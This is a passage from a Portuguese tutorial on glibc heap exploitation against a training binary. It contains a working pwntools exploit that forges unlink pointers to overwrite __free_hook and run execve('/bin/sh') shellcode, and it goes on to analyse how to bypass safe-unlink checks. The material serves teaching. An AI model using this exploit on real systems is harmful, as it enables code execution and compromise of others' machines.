
<p><img src="/img/papers/heap_p1/paper_heap1_199.png" alt="Fk e bk forjados" /></p>

<p>Se utilizarmos o comando <code class="language-plaintext highlighter-rouge">print</code> para visualizar o endereço da <code class="language-plaintext highlighter-rouge">__free_hook</code>, veremos que ela está exatamente 24 bytes, ou <code class="language-plaintext highlighter-rouge">0x18</code> bytes após o endereço para o qual nosso “fd” aponta, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_200.png" alt="Distância entre fd e __free_hook" /></p>

<p>E nossa “bk” aponta para o endereço do nosso <code class="language-plaintext highlighter-rouge">shellcode</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_201.png" alt="Bk apontando para o shellcode" /></p>

<p>Tudo que precisamos fazer para ativar o <em>unsafe unlink</em> é liberar o <em>chunk</em> B. A malloc vai checar sua <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code>, que foi retirada via <em>overflow</em>, e tentar consolidar os <em>chunks</em> A e B. O <code class="language-plaintext highlighter-rouge">prev_size field</code> que fornecemos, será usado para encontrar o início do <em>chunk</em> A, que será submetido ao processo de <em>unlinking</em>.<br />
Nosso “fd” forjado será seguido e nosso “bk” será copiado sobre o “bk” do <em>chunk</em> de destino, que irá se sobrepor ao <code class="language-plaintext highlighter-rouge">free hook</code>.</p>

<p>Então, vamos continuar a execução no GDB, alternar para o terminal de execução do script e liberar o <em>chunk</em> B no índice um, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_202.png" alt="Continuando a execuçã0" /></p>

<p>Voltando ao GDB, podemos pausar a execução e checar a <em>heap</em> novamente, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_203.png" alt="Heap vazia" /></p>

<p>Aparentemente tudo que sobrou dos dois <em>chunks</em> foi o <em>top chunk</em>. Isso acontece, pois, conforme vimos anteriormente, <em>chunks</em> normais podem se consolidar não só com outros <em>chunks</em> livres, mas também com o <em>top chunk</em>. Uma vez que o <em>chunk</em> B era adjacente ao <em>top chunk</em>, primeiramente a malloc consolidou os <em>chunks</em> A e B, e, uma vez que este novo <em>chunk</em> também estava livre, também foi consolidado ao <em>top chunk</em>.</p>

<p>Mas isto não significa que o <em>unsafe unlink</em> não funcionou. Consultando a memória para qual o <code class="language-plaintext highlighter-rouge">free hook</code> aponta, podemos verificar que está apontando para o nosso <code class="language-plaintext highlighter-rouge">shellcode</code> na <em>heap</em>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_204.png" alt="Free hook apontando para o shellcode" /></p>

<p>Porém, existe algo do qual não estavamos contando, que é a segunda parte do processo de <em>unlinking</em>, no qual nossa “bk” é seguida e nosso “fd” sobrescreve o “fd” do <em>chunk</em> de destino. Podemos ver esta situação na imagem abaixo, onde nosso “fd” foi escrito no meio do nosso <code class="language-plaintext highlighter-rouge">shellcode</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_205.png" alt="Fd corrompendo o shellcode" /></p>

<p>Isso significa que o <code class="language-plaintext highlighter-rouge">jmp</code> que utilizamos no <code class="language-plaintext highlighter-rouge">shellcode</code> em <code class="language-plaintext highlighter-rouge">Assembly</code> precisa pular 22 bytes, ou <code class="language-plaintext highlighter-rouge">0x16</code> bytes, antes de chegar na execução de código de fato.<br />
Podemos lidar com esta situação, utilizando <code class="language-plaintext highlighter-rouge">NOPs</code>, ou “<em>No operators</em>”.</p>

<blockquote>
  <p>Os <em>No operators</em> são operações em <code class="language-plaintext highlighter-rouge">Assembly</code> que não fazem absolutamente nada, quando a execução passa por estes bytes, simplesmente os ignora e segue o fluxo para a próxima instrução. No caso, se inserirmos 22 <code class="language-plaintext highlighter-rouge">NOPs</code> entre o <code class="language-plaintext highlighter-rouge">jmp</code> para nosso <code class="language-plaintext highlighter-rouge">shellcode</code> e o <code class="language-plaintext highlighter-rouge">shellcode</code> de fato, o <code class="language-plaintext highlighter-rouge">jmp</code> vai pular exatamente os 22 bytes que precisamos. Vamos adicionar os 22 <code class="language-plaintext highlighter-rouge">NOPs</code> na variável, ficando desta forma:</p>
</blockquote>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"nop;"</span><span class="o">*</span><span class="mh">0x16</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Agora podemos executar nosso script com as opções do GDB, liberar o <em>chunk</em> B e inspecionar o <code class="language-plaintext highlighter-rouge">__free_hook</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_206.png" alt="NOPs sobrescritos" /></p>

<p>Conforme podemos observar, nosso <code class="language-plaintext highlighter-rouge">jmp</code>, que agora entende que precisa pular 22 bytes está ilustrado em verde, seguido de 14 <code class="language-plaintext highlighter-rouge">NOPs</code> em vermelho, porém nosso “fd”, não sobrescreveu nosso <code class="language-plaintext highlighter-rouge">shellcode</code>, e sim, os 8 <code class="language-plaintext highlighter-rouge">NOPs</code> restantes. Se fizermos o <em>disassembly</em> da <code class="language-plaintext highlighter-rouge">__free_hook</code> com o comando <code class="language-plaintext highlighter-rouge">u</code>, podemos ver que agora nosso <code class="language-plaintext highlighter-rouge">jmp</code> é seguido de nossos <code class="language-plaintext highlighter-rouge">NOPs</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_207.png" alt="NOPs sobrescritos" /></p>

<p>Tudo que precisamos fazer agora em nosso script, é adicionar uma linha para liberar o <em>chunk</em> B, ativando nosso <em>unsafe unlink</em> e outra linha liberando o <em>chunk</em> A, executando nosso <code class="language-plaintext highlighter-rouge">shellcode</code> via <code class="language-plaintext highlighter-rouge">free hook</code>. O bloco final de exploração fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># prepara o shellcode execve("/bin/sh") com um "jmp over" onde o fd sera escrito.
</span><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="s">"jmp shellcode;"</span> <span class="o">+</span> <span class="s">"nop;"</span><span class="o">*</span><span class="mh">0x16</span> <span class="o">+</span> <span class="s">"shellcode:"</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="p">.</span><span class="n">execve</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">))</span>

<span class="c1"># requisitando 2 chunks
</span><span class="n">chunk_A</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>
<span class="n">chunk_B</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x88</span><span class="p">)</span>

<span class="c1"># criando variaveis
</span><span class="n">fd</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span> <span class="o">-</span> <span class="mh">0x18</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x20</span>
<span class="n">prev_size</span> <span class="o">=</span> <span class="mh">0x90</span>
<span class="n">fake_size</span> <span class="o">=</span> <span class="mh">0x90</span>

<span class="c1"># sobrescrevendo o size field do segundo chunk
</span><span class="n">edit</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="p">(</span><span class="mh">0x70</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">prev_size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fake_size</span><span class="p">))</span>

<span class="c1"># ativando o unsafe unlink
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_B</span><span class="p">)</span>

<span class="c1"># executando o shellcode via unsafe unlink
</span><span class="n">free</span><span class="p">(</span><span class="n">chunk_A</span><span class="p">)</span>

<span class="c1"># =======================================#
</span></code></pre></div></div>
<p>Ao executar o script em condições de produção, sem atrelar ao GDB, temos o <code class="language-plaintext highlighter-rouge">shell</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_208.png" alt="Shell obtido" /></p>

<p>Isto exemplifica a forma original da técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>.</p>

<blockquote>
  <p>Em resumo, requisitamos dois <em>chunks</em>, A e B, e aproveitamos da vulnerabilidade de <em>heap overflow</em> para retirar a <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> do <em>chunk</em> B.<br />
Quando liberamos o <em>chunk</em> B corrompido, a malloc entendeu que, por conta da <em>flag</em> <code class="language-plaintext highlighter-rouge">prev_inuse</code> não existir, o <em>chunk</em> anterior era um candidato para consolidação.<br />
A consolidação envolve desvincular o <em>chunk</em> candidato, ou vítima, de sua lista e adiciona seu tamanho ao <em>chunk</em> sendo liberado.<br />
Para encontrar o endereço do candidato, a malloc utiliza o campo <code class="language-plaintext highlighter-rouge">prev_size</code> do <em>chunk</em> livre.<br />
O campo <code class="language-plaintext highlighter-rouge">prev_size</code> é formado pelo ultimo <em>quadword</em> do <em>user data</em> pertencente ao <em>chunk</em> anterior.<br />
Fomos capazes de popular o campo <code class="language-plaintext highlighter-rouge">prev_size</code> do <em>chunk</em> B, porque o <em>chunk</em> A não estava realmente livre, então ainda tinhamos controle sobre o seu <em>user data</em>.<br />
Depois a malloc tentou desvincular o <em>chunk</em> A, e, por conta de ainda termos o controle do seu <em>user data</em>, fomos capazes de forjar um “fk” e um “bk” para que o processo de <em>unlink</em> pudesse utilizar.<br />
Apontamos nosso “fd” para o endereço da <code class="language-plaintext highlighter-rouge">__free_hook</code> menos 24 bytes e nosso “bk” para um <code class="language-plaintext highlighter-rouge">shellcode</code> que escrevemos na <em>heap</em>. O processo de <em>unlinking</em> seguiu nosso “fd” e copiou nosso “bk” sobre o <code class="language-plaintext highlighter-rouge">__free_hook</code>. Depois seguiu nosso “bk” e copiou nosso “fd” de <code class="language-plaintext highlighter-rouge">0x16</code> bytes sobre o nosso <code class="language-plaintext highlighter-rouge">shellcode</code>, do qual conseguimos contornar com uma instrução <code class="language-plaintext highlighter-rouge">jmp</code>.<br />
Finalmente ativamos a função <code class="language-plaintext highlighter-rouge">free()</code>, que foi redirecionadoa via <code class="language-plaintext highlighter-rouge">freee hook</code> para o nosso <code class="language-plaintext highlighter-rouge">shellcode</code> na heap, nos dando um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<p>Não podemos esquecer que o único motivo pelo qual fomos capazes de utilizar o <code class="language-plaintext highlighter-rouge">shellcode</code> desta forma, é porque o binário simula a situação existente antes do ano 2000, quando o <code class="language-plaintext highlighter-rouge">NX</code> ainda não tinha sido implementado e era possível executar comandos escritos em memória.  Esta exploração foi necessária para termos base em técnicas mais atuais de exploração do processo de <em>unlinking</em>.</p>

<p>No entanto, se estivermos lidando com <code class="language-plaintext highlighter-rouge">IoT</code> ou <code class="language-plaintext highlighter-rouge">dispositivos embarcados</code>, podemos ver que o <code class="language-plaintext highlighter-rouge">NX</code> não está ativado mesmo nos dias de hoje.</p>

<h2 id="safe-unlink">Safe Unlink</h2>

<p>Conforme vimos na técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>, fomos capazes de alterar o fluxo de execução de um programa, forjando <em>flags</em> e <em>pointers</em>, porém a execução de código só foi possível, pois estavamos utilizando um binário sem <code class="language-plaintext highlighter-rouge">NX</code> e uma versão antiga da GLIBC.</p>

<p>No entanto, nos dias de hoje, mesmo com a implementação do <code class="language-plaintext highlighter-rouge">NX</code> e com versões modernas da GLIBC, podemos nos aproveitar do processo de <em>unlinking</em> para conseguirmos execução de código utilizando a técnica <code class="language-plaintext highlighter-rouge">Safe Unlink</code>.</p>

<p>No diretório <code class="language-plaintext highlighter-rouge">safe_unlink</code> do material de apoio, temos um binário com o mesmo nome, do qual podemos checar suas implementações de segurança com a ferramente <code class="language-plaintext highlighter-rouge">checksec</code>.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_209.png" alt="Checando as implementações do binário" /></p>

<p>Conforme podemos observar, este binário foi compilado com <code class="language-plaintext highlighter-rouge">NX</code> e <code class="language-plaintext highlighter-rouge">Full RELRO</code>. A AMD introduziu o suporte ao <code class="language-plaintext highlighter-rouge">NX</code> nos dispositivos de <em>desktop</em> em 2003, seguido pela Intel em 2004 que chamaram de <code class="language-plaintext highlighter-rouge">XD</code> (<em>eXecute Disable</em>).</p>

<p>Também podemos ver que o binário está ligado a uma versão mais recente da GLIBC, 2.30.</p>

<p>Podemos enumerar este binário em tempo de execução ao carregá-lo no GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_210.png" alt="Enumerando com o GDB" /></p>

<p>Desta vez, temos um vazamento de endereço da GLIBC, porém nenhum vazamento da <em>heap</em>. Além do menu que já vimos anteriormente, com a adição da opção <em>target</em>.</p>

<p>Este binário tem o mesmo comportamento do binário utilizado na técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code> com a diferença de que foi compilado com <code class="language-plaintext highlighter-rouge">NX</code> e uma GLIBC mais recente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_211.png" alt="Limitações do binário" /></p>

<p>Ainda temos a limitação de dois <em>chunks</em> para requisitar, que precisam ter um tamanho de um <em>small bin</em> excluindo os tamanhos do <em>fastbins</em>.</p>

<p>Podemos escrever nestes <em>chunks</em> com a opção dois, e liberá-los pelo seu índice com a opção três.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_212.png" alt="Target" /></p>

<p>A opção quatro, assim como os binários explorados em outras técnicas, imprime o conteúdo do <em>data section target</em>.<br />
Se tentarmos criar um <em>chunk</em> com o tamanho de <code class="language-plaintext highlighter-rouge">0x90</code> bytes e preenchê-lo com mais dados que o suportado, veremos que o <em>bug</em> de <em>overflow</em> também existe, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_213.png" alt="Overflow da heap" /></p>

<p>Como primeiro objetivo de exploração deste binário, vamos seguir os mesmos passos das explorações anteriores, sobrescrevendo os dados contidos na <em>target</em>. E para isso, obviamente, vamos nos aproveitar do processo de <em>unlinking</em> para conseguir.</p>

<p>Para concluirmos o primeiro objetivo, teremos que efetuar o <em>bypass</em> de duas mitigações, a primeira, obviamente, é a implementação do <code class="language-plaintext highlighter-rouge">NX</code> que vai nos impedir de executar um <code class="language-plaintext highlighter-rouge">shellcode</code> que esteja armazenado na <em>heap</em>. Isso restringe muito o número de alvos viáveis para conseguir a escrita refletida que conseguimos forjando o processo de <em>unlinking</em>.</p>

<blockquote>
  <p>Lembrando que um dos pré-requisitos para conseguir a escrita refletida, é que ambos os endereços fornecidos de “fd” e “bk” respectivamente, apontem para um local da memória que seja passivo à escrita.<br />
Por exemplo, se escrevermos o endereço da <code class="language-plaintext highlighter-rouge">system()</code> na <code class="language-plaintext highlighter-rouge">free hook</code>, a escrita refletida irá tentar escrever o endereço da <code class="language-plaintext highlighter-rouge">free hook</code> para dentro da função <code class="language-plaintext highlighter-rouge">system()</code> que é marcada como não editável.</p>
</blockquote>

<p>A segunda mitigação que temos que efetuar o <em>bypass</em>, é a própria <code class="language-plaintext highlighter-rouge">macro unlink</code>. Nas versões antigas da GLIBC a macro <em>unlink</em> se tornou uma função chamada <code class="language-plaintext highlighter-rouge">unlink_chunk()</code>. O código abaixo, mostra como era a macro antes do ano 2000 que possibilitava o uso da técnica <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code>.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#define inlink(P, BK, FD)
</span><span class="p">{</span>
    <span class="n">BK</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="n">FD</span> <span class="o">=</span> <span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
    <span class="n">FD</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">BK</span><span class="p">;</span>
    <span class="n">BK</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>
<p>Tudo que esta função fazia, era uma cópia do “fd” e do “bk” de um <em>chunk</em>, num padrão de escrita refletida.</p>

<p>Já o código abaixo, mostra como a função <code class="language-plaintext highlighter-rouge">unlink</code> existe hoje.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">static</span> <span class="kt">void</span> <span class="nf">unlink_chunk</span><span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">chunksize</span> <span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">!=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">next_chunk</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted size vs. prev_size"</span><span class="p">);</span>
    <span class="n">mchunkptr</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd</span><span class="p">;</span>
    <span class="n">mchunkptr</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list"</span><span class="p">);</span>
    <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bk</span><span class="p">;</span>
    <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">in_smallbin_range</span> <span class="p">(</span><span class="n">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="n">p</span><span class="p">)</span>
            <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list (not small)"</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">==</span> <span class="n">p</span><span class="p">)</span>
                <span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
            <span class="k">else</span> <span class="p">{</span>
                <span class="n">fd</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
                <span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
                <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
                <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_mextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
            <span class="p">}</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="p">;</span>
            <span class="n">p</span><span class="o">-&gt;</span><span class="n">bk_nextsize</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">=</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>As partes deste código iniciadas pela função <code class="language-plaintext highlighter-rouge">malloc_printerr()</code> fazem parte da mitigação da exploração de <code class="language-plaintext highlighter-rouge">Unsafe Unlink</code> que abortam a execução quando um processo de comparação falha. O que interessa no momento, é a segunda checagem chamada de <code class="language-plaintext highlighter-rouge">safe unlinkink check</code> representada pelo trecho do código abaixo.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    <span class="k">if</span> <span class="p">(</span><span class="n">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
        <span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"corrupted double-linked list"</span><span class="p">);</span>
</code></pre></div></div>
<p>Este trecho, certifica que o <em>chunk</em> que está sendo desvinculado realmente faz parte de uma lista duplamente ligada. Abaixo, segue uma representação abstrata do processo efetuado por este código.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_214.png" alt="Checagem de unlink" /></p>

<p>Onde o “<code class="language-plaintext highlighter-rouge">p</code>” representa o <em>chunk</em> que está sendo liberado contendo seus “fd” e “bk” respectivamente.<br />
O processo irá abortar caso uma das duas opções ocorra:</p>

<ol>
  <li>Seguindo o “fd” do <em>chunk</em> sendo liberado, o “bk” encontrado não aponta de volta para o <em>chunk</em> sendo liberado, conforme ilustrado abaixo.</li>
</ol>

<p><img src="/img/papers/heap_p1/paper_heap1_215.png" alt="Checagem de unlink" /></p>

<ol>
  <li>Seguino o “bk” do <em>chunk</em> sendo liberado, o “fd” encontrado não aponta de volta para o <em>chunk</em> sendo liberado, conforme ilustrado abaixo.</li>
</ol>

<p><img src="/img/papers/heap_p1/paper_heap1_216.png" alt="Checagem de unlink" /></p>

<p>Olhando a perspectiva desta mitigação, poderiamos efetuar o <em>bypass</em> simplesmente passando o “fd” e “bk” forjado com o mesmo endereço do <em>chunk</em> que estamos liberando, pois forçaria os <em>chunks</em> adjacentes a terem os <em>pointers</em> corretos.<br />
No entanto, isso exigiria não só o vazamento do endereço da <em>heap</em>, que não temos neste binário, quando tornaria nossa escrita refletida inútil, pois poderíamos sobrescrever somente o <em>user data</em> do nosso próprio <em>chunk</em> sendo liberado.</p>

<p>Por tanto, com as mitigações ativas, é necessário encontrar outro alvo para a escrita refletida, que consiga passar pelo processo de <em>safe unlinking</em> e fornecer o que precisamos.</p>

<p>Conforme já temos visto sobre o funcionamento da malloc, uma das suas otimizações é que ela não rastreia os <em>chunks</em> alocados. Ao invés disso, ela mantém os <em>top chinks</em> e <em>top free chunks</em> em suas respectivas arenas, mas quando um <em>chunk</em> é alocado por uma <em>thread</em>, esta <em>thread</em> mantém uma referência para o <em>chunk</em> até que ele retorne para a malloc através de alguma função, como a <code class="language-plaintext highlighter-rouge">free()</code>.</p>

<p>Isto significa que o programa <strong>precisa</strong> armazenar os apontadores para todos os <em>chunks</em> em algum lugar, que pode ser na <em>stack</em>, em seu <em>data section</em> ou até mesmo manter na própria <em>heap</em>.</p>

<h3 id="arbitrary-write-via-safe-unlink">Arbitrary write via Safe Unlink</h3>

<p>Os binários que utilizamos até o momento, mantém os <em>chunk pointers</em> na <em>stack</em>, onde não somos capazes de adulterá-los por não ter um vazamento de endereço da <em>stack</em>.</p>

<blockquote>
  <p>Todo o comprimento da <em>stack</em> pode ser acessado e consultado através do GDB.</p>
</blockquote>

<p>Podemos vasculhar as áreas desse binário para encontrar alguma posição que nos dê vantagem.<br />
Ao iniciar o programa no GDB, podemos inspecionar suas áreas, antes de executá-lo, com o comando <code class="language-plaintext highlighter-rouge">info files</code>, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_217.png" alt="Visualizando as áreas do binário" /></p>

<p>Conforme podemos observar, o <em>range</em> da área <code class="language-plaintext highlighter-rouge">.bss</code> é bem pequeno, sendo de <code class="language-plaintext highlighter-rouge">0x40</code> bytes. Esta área, assim como a <code class="language-plaintext highlighter-rouge">.data</code>, pode conter variáveis que o binário utiliza.<br />
Com o comando <code class="language-plaintext highlighter-rouge">u</code>, podemos fazer o <code class="language-plaintext highlighter-rouge">disassembly</code> desta área para checar suas instruções, conforme imagem abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_218.png" alt="Disassembly do .bss" /></p>

<p>Como podemos ver, no endereço <code class="language-plaintext highlighter-rouge">0x602060</code> aparentemente existe uma variável chamada <code class="language-plaintext highlighter-rouge">m_array</code>. Podemos checar seu conteúdo com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_219.png" alt="Conteúdo da m_array" /></p>

<p>O formato desta variável parece interessante, aparentemente ela guarda o <em>user data</em> e o <em>size field</em> dos dois <em>chunks</em> que podemos solicitar. Podemos confirmar isso, executando o programa, solicitando um <em>chunk</em>, populando seu <em>user data</em> e inspecionando esta variável novamente.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_220.png" alt="Criando um chunk e populando" /></p>

<p>Com o <em>chunk</em> criado, vamos inspecionar a variável <code class="language-plaintext highlighter-rouge">m_array</code> novamente conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_221.png" alt="Conteúdo da m_array" /></p>

<p>E podemos confirmar que esta variável faz exatamente o que aparenta. Portanto, este binário em específico, armazena seus <em>chunk pointers</em> no <em>data section</em> do próprio binário, e o mais importante: ele salva o endereço do <em>user data</em> do <em>chunk</em>, este <em>pointer</em> é usado pelo programa, quando as funções <code class="language-plaintext highlighter-rouge">free()</code> e <code class="language-plaintext highlighter-rouge">edit()</code> são chamadas. Podemos confirmar com o comando <code class="language-plaintext highlighter-rouge">vis</code> que nos mostra o mesmo endereço no <em>user data</em> do <em>chunk</em> criado.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_222.png" alt="Heap" /></p>

